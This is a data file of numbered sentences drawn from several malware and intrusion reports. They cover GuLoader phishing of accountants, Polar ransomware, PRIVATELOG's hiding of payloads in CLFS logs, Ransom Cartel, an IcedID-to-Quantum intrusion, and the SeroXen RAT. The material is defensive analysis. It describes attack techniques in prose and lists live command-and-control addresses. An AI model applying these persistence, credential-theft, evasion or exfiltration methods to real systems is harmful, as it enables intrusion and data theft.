by the malware, including ieinstal.exe (the tool that installs Add-Ons into Internet Explorer). ","12100":"The malware makes several other changes to Windows settings during the infection process.","12101":"It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system. ","12102":"It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot. ","12103":"And that Run key references a different Registry key, in HKEY_CURRENT_USER\\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process. ","12104":"Once infected, the ielowutil.exe binary constantly attempts to contact its command\u2013and-control server, on 64.44.101.171:9191.","12105":"During our attempts to infect machines with the malware, that C2 server failed to respond.","12106":"However, we did infect a test machine with other samples from this attack, and some of those were successful at connecting to C2 servers at 84.21.172.49:1040 (ironic port number!)","12107":"and 185.225.74.91:2080.","12108":"Both of those C2s were live as of publication of this blog. ","12109":"We also detected the infected computer repeatedly attempting to resolve the address of the domain newmansubzero.com, which is the 64.44.","12110":"address above. ","12111":"Guidance and detection Tax preparers and accountants are extremely busy at the best of times, but during US tax season, which culminates in mid-April, they are the busiest they will be all year.","12112":"Harried CPAs from firms of all sizes must be wary that they are targets for criminals who would love nothing more than the sensitive financial data they receive in abundance at this time of year. ","12113":"The attack method in this case takes advantage of the frenetic pace of tax season and uses a social engineering tactic to smooth the way for the malware to be delivered via email.","12114":"As such, it\u2019s very prudent to be cautious when you\u2019re approached by potential new clients.","12115":"Ask them if they will speak to you on the phone directly, who referred them to you, and if they\u2019d be willing to come in for an in-person evaluation. ","12116":"Most of all, be very wary of people who send you a Dropbox link to a password-protected Zip file at any time of year.","12117":"When the Zip file is password protected, it can make the contents un-scannable by endpoint security tools.","12118":"If they provide a password, unzip the file and then scan the contents with an endpoint security tool before opening them. ","12119":"The PDF icon used for the Shortcut in the attack is also distinctive and unique.","12120":"The icon, which doesn\u2019t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside. ","12121":"It\u2019s also notable that the icon does have the little arrow in the bottom left corner that indicates it is a Shortcut, and not a document.","12122":"It\u2019s possible a busy accountant may not notice that detail. ","12123":"When in doubt, you can also right-click (not left-click) the icon, one click only, and choose Properties.","12124":"Even though the Properties sheet won\u2019t display the Powershell command, if the file is a Shortcut it will have a Shortcut tab (normal document files won\u2019t have those) and it accurately shows that the \u201cTarget type\u201d is a Visual Basic Script (VBScript Script File).","12125":"Hovering the mouse pointer over the Shortcut icon causes the malicious shortcut to display the information pushed into the Comment field, which makes it appear that the document is in fact a PDF when it is not. ","12126":"If you still suspect things are not as they should be, ask the potential customer to call you on the phone before you open the files.","12127":"The attackers, in this case, seemed to limit their communication to email. ","12128":"Sophos products detect various aspects of the attack quite comprehensively: Endpoint will detect the shortcut file as Troj\/LnkObf-T or Mal\/DownLnk-D and the VBS payload of the shortcut as VBS\/Inject-IPG.","12129":"Some payload samples may be detected as Behaviorally, it detects the injection techniques used by the attackers as Evade_34a or Evade_34b.","12130":"GuLoader code in memory also will be detected as Mem\/Guload-A. Our network security products will block communication to the IP addresses used to host the payloads and the C2 addresses.

","12195":"We initially assumed that this was yet another attack on corporate networks with a common variety of ransomware.","12196":"However, what we found was different: this intrusion was the work of a well-known Asian APT group implicated in cyberespionage against government targets.","12197":"The initial successful compromise had taken place two years prior. ","12198":"In this article, we will share the results of our investigation of this targeted attack, which started with the compromise of a foreign office.","12199":"Ultimately, we succeeded in bringing the infrastructure back to a secure condition and reversing the damage that had been done.

","12205":"We believe that the initial entry point to the foreign office's network was a vulnerable server on the network perimeter.","12206":"Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of the ChinaChopper and TwoFace web shells.

","12319":"Most of the affected computers had not only been disconnected from the corporate network, but turned off for analysis of the hard drive contents.","12320":"Due to this, the uptime of the computers could not be known.","12321":"The operating system logs contain timestamps for shutdown and power on.","12322":"But in this case, the ransomware destroys these logs twice.","12323":"So we were unable to find any clues pointing at possible values of uptime on the affected computers themselves. ","12324":"Fortunately, however, SCCM was used on the client infrastructure, with client-side agents running on all the encrypted computers.","12325":"The information we needed was stored centrally and had not been tampered with: all we needed was some trial-and-error to choose the right values. ","12326":"Now that we had relatively precise uptime values, we needed to determine when the ransomware had run.","12327":"Remember that at the end, the malware deletes the intermediate DLL library and encrypted ransomware, but not the legitimate executable file whose process is used for performing the malicious actions.","12328":"In other words, the time at which this file appeared on the system should be the approximate time when the ransomware ran, to within several seconds.","12329":"We succeeded in bruteforcing the exact value of the base encryption key in about a minute on an ordinary workstation (on the order of a few tens of thousands of iterations).","12330":"We could then decrypt the remaining files.","12331":"In a few cases, we had a tougher time bruteforcing the key at first.","12332":"The reason was that the timezones had been set incorrectly.","12333":"With this realization, we were able to conquer this issue as well. ","12334":"Attribution We mentioned the SysUpdate and HyperBro backdoors from the attackers' toolkit.","12335":"These are somewhat esoteric Remote Access Trojans used by the APT27 group (also known as Bronze Union, LuckyMouse, Emissary Panda, or Iron Tiger).","12336":"The group likely has Asian roots, with activity since at least 2010.","12337":"The group focuses its attention on government targets in the defense and energy industries, as well as aerospace and manufacturing.","12338":"Most commonly, the original attack vector is a compromise of the victim's web servers by exploiting vulnerabilities, bruteforcing credentials, or taking advantage of web server misconfigurations.","12339":"Despite the similarities in tactics, techniques, and procedures (TTPs) and use of a telltale toolkit, some of the team's researchers are skeptical about attribution of the attacks to APT27. ","12340":"1.","12341":"Choice of target Media companies had never been of interest for APT27.","12342":"This is consistent with the findings of our incident investigation: the attackers did not try to access private information on the target infrastructure, instead only running software for direct financial gain. ","12343":"2.","12344":"Cryptocurrency mining and ransomware ","12345":"This is atypical and, moreover, ill-suited software that can quickly attract attention and wreck any plans for long-term cyberspying.","12346":"The URL address to which the ransomware \"phones home\" upon completing its work does not have anything in common with APT27 network infrastructure.","12347":"Of course, some groups (such as Lazarus and Winnti) combine cyberspying with direct financial motivations, so perhaps APT27 is broadening its previously limited range of interests.","12348":"Or, as an alternative, the group has reached an agreement with other attackers for use of their software in return for a part of the proceeds.","12349":"In favor of attribution of Polar to APT27, we can note the sequence of payload, execution, and naming: the encrypted SysUpdate backdoor is often named sys.bin.url and the Polar ransomware was named Sysurl.","12350":"Hex, in a rather similar way.","12351":"However, this could also be a false flag.

","12590":"Mandiant has yet to observe PRIVATELOG or STASHLOG in any customer environments or to recover any second-stage payloads launched by PRIVATELOG.","12591":"This may indicate malware that is still in development, the work of a researcher, or targeted activity. ","12592":"CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files. ","12593":"CLFS is a log framework that was introduced by Microsoft in Windows Vista and Windows Server 2003 R2 for high performance.","12594":"It provides applications with API functions\u2014available in clfsw32.dll\u2014to create, store and read log data. ","12595":"Because the file format is not widely used or documented, there are no available tools that can parse CLFS log files.","12596":"This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. ","12597":"This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API. ","12598":"In Microsoft Windows, CLFS is notably used by the Kernel Transaction Manager (KTM) for both Transactional NTFS (TxF) and Transactional Registry (TxR) operations.","12599":"These allow applications to perform a number of changes on the filesystem or registry, all grouped in a single transaction that can be committed or rolled back.","12600":"For example, to open a registry key in a transaction, the functions RegCreateKeyTransacted(), RegOpenKeyTransacted(), and RegDeleteKeyTransacted() are available. ","12601":"Registry transactions are stored in dedicated files with the following naming scheme: <hive><GUID>.TMContainer<number>.regtrans-ms or <hive><GUID>.TxR.<number>.regtrans-ms. ","12602":"These are CLFS containers that are referenced in a master .blf","12603":"file that only contains metadata and can be found in various locations including user profile directories. ","12604":"Registry transaction forensics were briefly explored in a previous blog post.","12605":"The CLFS master and container file formats are mostly undocumented; however, previous research is available on GitHub. ","12606":"Malware Obfuscation As with many malware families, most of the strings used by PRIVATELOG and STASHLOG are obfuscated.","12607":"Yet the technique observed here is uncommon and relies on XOR\u2019ing each byte with a hard-coded byte inline, with no loops.","12608":"Effectively, each string is therefore encrypted with a unique byte stream. ","12609":"Figure 1: Sample string deobfuscation for \"PrintNotify\" Interestingly, some of the deobfuscated strings from the installer are used for logging error messages and have spelling errors or typos such as: Log index=%d, data border exceed bounday.\\n Interal data hash mismatch.\\n Log buffer size=%u too small, expect aleast %u bytes.\\n Introducing STASHLOG In addition to containing obfuscated strings, the installer\u2019s code is protected using various control flow obfuscation techniques that make static analysis cumbersome.","12610":"Figure 2 is a graph overview of the installer\u2019s main() function demonstrating the effects of the control flow obfuscation. ","12611":"Figure 2: Graph view of main() STASHLOG has two different modes of operation: Without any arguments, during which it will prepare the environment With a single argument, which is a file that should be hidden in a CLFS file Preparing the Environment Executed without arguments, the installer prints two values to the console: The GUID returned from the registry value of HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID A 56-byte value derived from a randomly generated GUID with CoCreateGUID() Figure 3: Sample console output The 56-byte value is a concatenation of the random GUID, its SHA1 hash, and the SHA1 hash of the previous values.","12612":"So: GUID+sha1(GUID)+sha1(GUID+sha1(GUID)). ","12613":"The randomly generated GUID is stored as a string in the GlobalAtom table, prefixed with win::.","12614":"This table resides in memory and contains strings with their identifiers available to all applications. ","12615":"If a string prefixed with win:: already exists when the installer is executed, then the pre-existing GUID in the GlobalAtom table is reused. ","12616":"Effectively, when executed with no arguments, the installer generates and prints out encryption keys that the actor uses to pre-encrypt the payload before it is written to disk. ","12617":"Stashing the Payload When launched with an argument, the installer opens and decrypts the contents of the file passed as an argument.","12618":"It verifies that the file is suffixed by its SHA1 hash, and then generates the same 56-byte value using the stored GlobalAtom GUID string in memory. ","12619":"The 56-byte value is SHA1 hashed again and the first 16-bytes form the initialization vector (IV), while the key is the 16-byte MachineGUID value from the host\u2019s registry.","12620":"The encryption algorithm is HC-128, which is rarely seen used in malware. ","12621":"The expected decrypted file contents have a 40-byte header: struct payloadHeader { DWORD magic; DWORD minWinVer; DWORD maxWinVer; DWORD totalSize; WORD numBlocks; WORD unknown; BYTE sha1sum[20]; } In the analyzed installer, the \u201cmagic\u201d value is referred to as a checksum; however, STASHLOG verifies this value matches the hard-coded value 0x00686365.","12622":"The number of blocks, specified at offset 16, must be between 2 and 5.","12623":"The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20. ","12624":"Following the payload header, the malware expects blocks of encrypted data with 8-byte headers.","12625":"Each block header has the following structure: struct blockHeader { DWORD magic; DWORD blockSize; } Once the malware has checked and validated the structure of the payload, it searches for .blf files in the default user\u2019s profile directory and uses the .blf file with the oldest creation date timestamp. ","12626":"In practice, the malware should typically find the file used for registry transaction logs: C:\\Users\\Default\\NTUSER.DAT<GUID>.TM.blf If a matching .blf file is indeed found, it is opened with the CreateLogFile() API from clfsw32.dll.","12627":"This function opens CLFS logs and expects a file name in the following format, without the .blf extension: log:<LogName>[::<LogStreamName>] The log file is reset using the CloseAndResetLogFile() function and will be opened again to insert the data. ","12628":"Before inserting data into the CLFS log file, the malware decrypts each block using HC-128.","12629":"The key is the 16-byte atom GUID and the IV is the first 16-bytes of the atom GUID SHA1 hash.","12630":"Each block is then re-encrypted with the new key material as follows: The encryption key is the 16-byte GUID from GetVolumeNameForVolumeMountPointW().","12631":"The IV is the first 16-bytes of the SHA1 hash of the concatenated GUIDs from: GetVolumeNameForVolumeMountPointW() The registry value HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID The contents are written to the CLFS log file using the clfsw32.dll API function ReserveAndAppendLog().","12632":"The payload header is written to the log file as the first entry, followed by separate entries for each block. ","12633":"The data is effectively stored in the first container file for the registry transaction log: C:\\Users\\Default\\NTUSER.DAT<GUID>.TMContainer00000000000000000001.regtrans-ms. ","12634":"Onto PRIVATELOG The PRIVATELOG sample recovered by Mandiant is an un-obfuscated 64-bit DLL named prntvpt.dll.","12635":"It contains exports, which mimic those of legitimate prntvpt.dll files, although the exports have no functionality.","12636":"PRIVATELOG expects to be loaded from PrintConfig.dll, which is the main DLL of a service named PrintNotify, via DLL search order hijacking. ","12637":"The malicious code is executed at the DLL\u2019s entry point.","12638":"It starts by verifying the command-line arguments of the process it is running in and expects to be running under svchost.exe -k print.","12639":"If this matches, the malware resolves the function address for the ServiceMain export function of PrintConfig.dll, which is the service entry point of the service using this command line.","12640":"This function is patched using Microsoft Detours\u2014a publicly available library used for instrumenting Win32 functions\u2014so that the execution flow appears to happen in the legitimate service DLL. ","12641":"The patched ServiceMain function is where PRIVATELOG executes most of its functionality. ","12642":"Similarly to STASHLOG, PRIVATELOG starts by enumerating *.blf files in the default user\u2019s profile directory and uses the .blf file with the oldest creation date timestamp. ","12643":"If a matching .blf file is found, PRIVATELOG opens it with the clfsw32.dll function CreateLogFile().","12644":"The log file is then marshalled and parsed using other functions specific to CLFS, such as CreateLogMarshallingArea(), ReadLogFile() and ReadNextLogFile().","12645":"The malware expects to find specific entries which match our analysis of the installer. ","12646":"PRIVATELOG expects the first log entry to have the following format: ","12647":"A size greater than 40 (payload header size)","12648":"A WORD value of 2, 3, 4, or 5 at offset 16 (number of blocks) ","12649":"If the first entry matches the aforementioned criteria, then subsequent records are read until one has an 8-byte header with the following: Its first DWORD must equal 2 (assumed magic value) ","12650":"Its second DWORD must be less than the entry\u2019s size minus the header.","12651":"This value equals the size of the payload which will be decrypted. ","12652":"Once the expected log entry is found, its contents are decrypted using the HC-128 encryption algorithm.","12653":"The decryption key and IV are generated using the same unique host properties that were used by STASHLOG. ","12654":"It is worth noting that PRIVATELOG only decrypts the first matching block and that at least 2 to 5 blocks are expected to be inserted by STASHLOG. ","12655":"PRIVATELOG finally uses a rarely seen technique to execute the DLL payload, which this time relies on NTFS transactions.","12656":"The injection process is similar to Phantom DLL hollowing and is described as follows: Open a transacted handle to a copied file via the API CreateFileTransactedA() ","12657":"In the sample analyzed by Mandiant, the file used for the transaction is a copy of the legitimate binary C:\\Windows\\System32\\dbghelp.dll, which is copied to C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\dbghelp.dll.

","12723":"There are a number of theories about the origins of Ransom Cartel.","12724":"One theory in the community suggests that Ransom Cartel could be the result of multiple groups merging.","12725":"However, researchers at MalwareHunterTeam have put forward that one of the groups believed to have merged has denied any connection with Ransom Cartel.","12726":"Additionally, Unit 42 has seen no connection between these groups and Ransom Cartel other than that many of them have connections to REvil. ","12727":"At this time, we believe that Ransom Cartel operators had access to earlier versions of REvil ransomware source code, but not some of the most recent developments (see our Ransom Cartel and REvil Code Comparison for more details). ","12728":"This suggests there was a relationship between the groups at some point, though it may not have been recent. ","12729":"Unit 42 has also observed Ransom Cartel group breaching organizations, with the first known victims observed by us around January 2022 in the U.S. and France.","12730":"Ransom Cartel has attacked organizations in the following industries: education, manufacturing, and utilities and energy.","12731":"Unit 42 incident responders have also assisted clients with response efforts in several Ransom Cartel cases. ","12732":"Like many other ransomware gangs, Ransom Cartel leverages double extortion techniques.","12733":"Unit 42 has observed the group taking an aggressive approach, threatening not only to publish stolen data to their leak site, but also to send it to the victim\u2019s partners, competitors and the news in an effort to inflict reputational damage. ","12734":"Ransom Cartel typically gains initial access to an environment via compromised credentials, which is one of the most common vectors for initial access for ransomware operators.","12735":"This includes access credentials for external remote services, remote desktop protocol (RDP), secure shell protocol (SSH) and virtual private networks (VPNs).","12736":"These credentials are widely available in the cyber underground and offer threat actors a reliable means to gain access to victims' corporate networks. ","12737":"These credentials can also be obtained through the work of ransomware operators themselves or by purchasing them from an initial access broker. ","12738":"Initial access brokers are actors who offer to sell compromised network access.","12739":"Their motivation is not to carry out cyberattacks themselves but rather to sell the access to other threat actors.","12740":"Due to the profitability of ransomware, these brokers likely have working relationships with RaaS groups based on the amount they are willing to pay. ","12741":"Unit 42 has seen evidence that Ransom Cartel has relied on this type of service to gain initial access for ransomware deployment. ","12742":"Unit 42 has also observed Ransom Cartel encrypting both Windows and Linux VMWare ESXi servers in attacks on corporate networks. ","12743":"Tactics, Techniques and Procedures Observed During Ransom Cartel Attacks Unit 42 observed a Ransom Cartel threat actor using a tool called DonPAPI, which has not been observed in past incidents.","12744":"This tool can locate and retrieve Windows Data Protection API (DPAPI) protected credentials, which is known as DPAPI dumping. ","12745":"DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,","12746":"credentials saved in web browsers, etc.","12747":"To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.","12748":"To compromise Linux ESXi devices, Ransom Cartel uses DonPAPI to harvest credentials stored in web browsers used to authenticate to the vCenter web interface. ","12749":"We also observed the threat actor using additional tools, including LaZagne to recover credentials stored locally and Mimikatz to steal credentials from host memory. ","12750":"In order to establish persistent access to Linux ESXi devices, the threat actor enables SSH after authenticating to vCenter.","12751":"The threat actor will create new accounts and sets the account\u2019s user identifier (UID) to zero.","12752":"For Unix\/Linux users, a UID=0 is root.","12753":"This means any security checks are bypassed. ","12754":"The threat actor was observed downloading and using a cracked version of a legitimate tool called PDQ Inventory, which is a legitimate system management solution that IT administrators use to scan their network and collect hardware, software and Windows configuration data.","12755":"Ransom Cartel used this as a remote access tool to establish an interactive command and control channel and to scan the compromised network. ","12756":"Once a VMware ESXi server is compromised, the threat actor launches the encryptor, which will automatically enumerate the running virtual machines (VMs) and shut them down using the esxcli command.","12757":"Terminating the VM processes ensures that the ransomware can successfully encrypt VMware-related files. ","12758":"During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.","12759":"These extensions are associated with ESXi snapshots, log files, swap files, paging files and virtual disks.","12760":"Post-encryption, the following file extensions have been observed: .zmi5z, .nwixz, .ext, .zje2m, .5vm8t and .m4tzt. ","12761":"Ransom Notes Unit 42 has observed two different versions of ransom notes sent by Ransom Cartel.","12762":"The first note was first observed around January 2022, and the other one first appeared in August 2022.","12763":"The second version appeared to be completely rewritten, as shown in Figure 1. Figure 1.","12764":"Ransom Cartel ransom notes.","12765":"The note on the left was first observed in January 2022; the note on the right was first observed in August 2022.It's interesting to note that the structure of the first ransom note used by Ransom Cartel shares similarities with a ransom note sent by REvil, as shown in Figure 2.","12766":"In addition to the use of similar wording, both notes employed the same format of a 16-byte hexadecimal string for the UID. Figure 2.","12767":"Ransom Cartel ransom note shown on the left, compared to a ransom note sent by REvil shown on the right.","12768":"Ransom Cartel TOR Site Ransom Cartel\u2019s website for communication with victims was available via a TOR link provided in the ransom note.","12769":"We\u2019ve observed multiple TOR URLs belonging to Ransom Cartel, which likely indicates that they had been changing infrastructure and actively developing their website.","12770":"A TOR private key is needed to access the website. ","12771":"When the key is entered, the following page is loaded: Figure 3.","12772":"Ransom Cartel TOR site landing page.","12773":"Upon entering the TOR site through the Authorization button, a screen requesting input of the details included in the ransom note is requested. ","12774":"Figure 4.","12775":"Ransom Cartel website, requesting the ID and key provided in the ransom note.","12776":"Once authorization is completed on the TOR site, the page shown in Figure 5 appears.","12777":"The site includes details such as ransom demand, in both US dollars and bitcoin, and the Bitcoin wallet address.

","12811":"Table 7.","12812":"Ransom Cartel accepted arguments. ","12813":"With that, let\u2019s move on to analyzing the session secret generation procedure. ","12814":"Ransom Cartel first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.","12815":"Otherwise, it will generate a total of two session secrets at runtime, with each secret containing 88 bytes of data. ","12816":"First, a public and private key pair will be generated using the code from this Curve25519 repository (session_public_1 and session_private_1).","12817":"When generating the first session secret, another session key pair is generated, (session_public_2 and session_private_2) and session_private_2 is paired with attacker_cfg_public (the public key embedded within the configuration) to generate a shared key.","12818":"This shared key is then hashed with the SHA3 hashing algorithm.","12819":"The resulting hash is used as an AES key with a random 16-byte initialization vector (IV) for encrypting a data blob consisting of four null bytes followed by session_private_1.

","12851":"Figure 12.","12852":"Decrypted REvil configuration.","12853":"As discussed previously, another major overlap is the code reuse across the two samples of Ransom Cartel.","12854":"Both use an identical encryption scheme, generating multiple public\/private key pairs, and creating session secrets using the same procedure found within REvil samples.

","12949":"This case shares similarities of the IcedID campaign detailed by Malware-Traffic-Analysis.net, where the ADGet.exe application was referenced. ","12950":"This intrusion began by the execution of IcedID malware contained within an ISO image.","12951":"The ISO file was delivered to the victim as part of a malspam campaign.","12952":"Delivering payloads using an ISO image is a common technique observed in several prior cases.","12953":"This technique has grown in use as threat actors look to evade Mark-of-the-Web controls. ","12954":"The ISO image delivered a hidden directory containing a IcedID payload and a batch file.","12955":"After being successfully mounted, the end user only sees a malicious LNK file named documents inside the virtual hard drive.","12956":"Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user\u2019s AppData\\Local\\Temp folder and loads it using rundll32.","12957":"A scheduled task was created at that time to maintain persistence on this host as well. ","12958":"Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.","12959":"Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL rapuab1.dll was executed from the IcedID malware.","12960":"This led to another round of discovery using net followed by AdFind. ","12961":"The threat actor installed Atera and Splashtop remote access software via an MSI file named hp.msi.","12962":"After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus.","12963":"The threat actor then proceeded to exploit CVE-2020-1472, aka ZeroLogon.","12964":"This was followed by a batch script used to perform DNS lookups on hosts across the environment.","12965":"After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.","12966":"They then repeated the install of the remote access software package. ","12967":"Some two hours later, a Cobalt Strike beacon named Nigu.exe was executed.","12968":"With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.","12969":"Another round of activity took place using system tools, batch files, and Adget.","12970":"Several more beacons were also loaded on the host using DLLs and PowerShell. ","12971":"At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.","12972":"They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.","12973":"These actions, however, failed to get a beacon to launch on the domain controller being targeted.","12974":"After an hour or so of failures, the threat actors proceeded to RDP to the domain controller.","12975":"Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt. Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).","12976":"These beacons, however, continued to crash and fail to run.","12977":"Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.","12978":"The Cobalt Strike beacons then began to execute successfully on the domain controller.","12979":"Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities. ","12980":"A few hours later, the threat actors installed the RSAT tools onto the beachhead host.","12981":"However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.","12982":"Back on the domain controller, ProcDump was used to dump LSASS memory.","12983":"The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network. ","12984":"The threat actors went quiet for around seven hours.","12985":"When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.","12986":"For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.","12987":"During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.","12988":"A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.","12989":"These discovery actions were completed several times again in other various batch files. ","12990":"On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.","12991":"Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.","12992":"Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike. ","12993":"After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service.","12994":"The threat actors then staged a ransomware binary named locker_64.exe on the backup server but did not immediately execute it. ","12995":"Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.","12996":"This appeared to fail.","12997":"The threat actors then proceeded to execute the payload manually in several ways, across various hosts.","12998":"Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec. ","12999":"Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.","13000":"The time to ransomware was just over 78 hours from the initial IcedID infection.","13001":"All domain joined systems were encrypted with Quantum ransomware.

","13265":"Executive summary SeroXen is a new Remote Access Trojan (RAT) that showed up in late 2022 and is becoming more popular in 2023.","13266":"Advertised as a legitimate tool that gives access to your computers undetected, it is being sold for only $30 for a monthly license or $60 for a lifetime bundle, making it accessible. ","13267":"Key takeaways: SeroXen is a fileless RAT, performing well at evading detections on static and dynamic analysis. ","13268":"The malware combines several open-source projects to improve its capabilities.","13269":"It is a combination of Quasar RAT, r77-rootkit and the command line NirCmd. ","13270":"Hundreds of samples have shown up since its creation, being most popular in the gaming community.","13271":"It is only a matter of time before it is used to target companies instead of individual users. ","13272":"Analysis Quasar RAT is a legitimate open-source remote administration tool.","13273":"It is offered on github page to provide user support or employee monitoring.","13274":"It has been historically associated with malicious activity performed by threat actors, APT groups (like in this Mandiant report from 2017), or government attacks (in this report by Unit42 in 2017). ","13275":"It was first released in July 2014 as \u201cxRAT\u201d and renamed to \u201cQuasar\u201d in August 2015.","13276":"Since then, there have been released updates to the code until v1.4.1 in March 2023, which is the most current version.","13277":"As an open-source RAT tool with updates 9 years after its creation, it is no surprise that it continues to be a common tool used by itself or combined with other payloads by threat actors up to this day. ","13278":"In a review of the most recent samples, a new Quasar variant was observed by Alien Labs in the wild: SeroXen.","13279":"This new RAT is a modified branch of the open-source version, adding some modifications features to the original RAT.","13280":"They\u2019re selling it for monthly or lifetime fee.","13281":"Figure 1 contains some of the features advertised on their website. ","13282":"Figure 1.","13283":"SeroXen features announced on its website. ","13284":"This new RAT first showed up on a Twitter account, established in September 2022.","13285":"The person advertising the RAT appeared to be an English-speaking teenager.","13286":"The same Twitter handle published a review of the RAT on YouTube.","13287":"The video approached the review from an attacking\/Red Team point of view, encouraging people to buy the tool because it is worth the money.","13288":"They were claiming to be a reseller of the tool. ","13289":"In December 2022, a specific domain was registered to market\/sell the tool, seroxen[.]com.","13290":"The RAT was distributed via a monthly license for $30 USD or a lifetime license of $60 USD.","13291":"It was around that time that the malware was first observed in the wild, appearing with 0 detections on VirusTotal. ","13292":"After a few months, on the 1st of February, the YouTuber CyberSec Zaado published a video alerting the community about the capabilities of the RAT from a defensive perspective.","13293":"In late February, the RAT was advertised on social media platforms such as TikTok, Twitter, YouTube, and several cracking forums, including hackforums.","13294":"There were some conversations on gaming forums complaining about being infected by malware after downloading some video games.","13295":"The artifacts described by the users matched with SeroXen RAT. ","13296":"The threat actor updated the domain name to seroxen[.]net by the end of March.","13297":"This domain name was registered on March 27th, 2023, after seroxen[.]com was decommissioned.","13298":"The threat actor used GoDaddy for registration and Cloudflare for hosting the website.","13299":"These domains are only used for selling and marketing purposes, and not for Command and Control (C&C) communications. ","13300":"Figure 2: SeroXen website Based on the packed versions uploaded to VT, it appears that the RAT is being used for targeting video game users.","13301":"Several lure injector cheat files have been observed with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2.","13302":"The threat actor used Discord for the distribution of some of the samples. Figure 3.","13303":"SeroXen timeline. ","13304":"One of the most relevant announced features is that it is a fully undetectable version.","13305":"This is currently true from a static analysis point of view, since the RAT is packaged into an obfuscated PowerShell batch file.","13306":"The file\u2019s size typically ranges between 12-14 megabytes, as we can see in sample 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 uploaded to VT on May 21.","13307":"Due to its relatively large size, certain antivirus may choose not to analyze it, potentially bypassing detection.","13308":"This sample currently has 0 detections on VT, but some of the crowdsourced Sigma Rules do detect the activity as suspicious. ","13309":"As the malware is fileless and executed only in memory after going through several decryptions and decompression routines, it is more difficult to detect by antiviruses.","13310":"In addition, its rootkit loads a fresh copy of ntdll.dll, which makes it harder to detect by Endpoint Detection & Response (EDR) solutions that hook into it to detect process injections. ","13311":"Regarding the dynamic analysis, it is worth noting that some sandbox environments might fail to detect the RAT due to its utilization of several techniques to evade virtualization and sandbox detection mechanisms and string encryption subsequent payloads. ","13312":"The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system\u2019s manufacturer.","13313":"This enables it to identify virtualization environments such as VMware and abort the execution to delay and make the analysis harder.","13314":"The RAT also checks for the presence of debuggers and uses pings make the threads sleep. ","13315":"Currently, most child processes and files dropped during the execution of the RAT have a low detection rate. ","13316":"Execution analysis When the malicious payload is delivered to the victim, commonly through a phishing mail or a Discord channel \u2013 the victim often receives a ZIP file containing a benign file in plain sight, and the heavily obfuscated batch file is hidden and automatically executed when launched.","13317":"The bat file format is always very similar and looks like the contents of Figure 4, followed by base64 encoded text later in the file. ","13318":"Figure 4.","13319":"Obfuscated bat script. ","13320":"During the bat execution, the script extracts two separate binaries from the base64 encoded text, AES decrypts, and GZIP decompresses it to produce two separate byte arrays.","13321":"These byte arrays are then used with .NET reflection to perform an in-memory load of the assembly from its bytes, locate the binary\u2019s entry point, and perform an Invoke on both. ","13322":"Throughout the decryption process, the attackers had the need to create a legitimate looking folder to drop an illicit version of the System Configuration Utility msconfig.exe that is required later.","13323":"For this purpose, the script creates the folder \u201cC:Windows System32\u201d, with a space after Windows and deletes it as soon as the utility is running.","13324":"If it wasn\u2019t for this file temporarily dropped into disk, the RAT would be fully fileless. ","13325":"The execution of one of the above-mentioned binaries leads to another obfuscated binary carrying an embedded 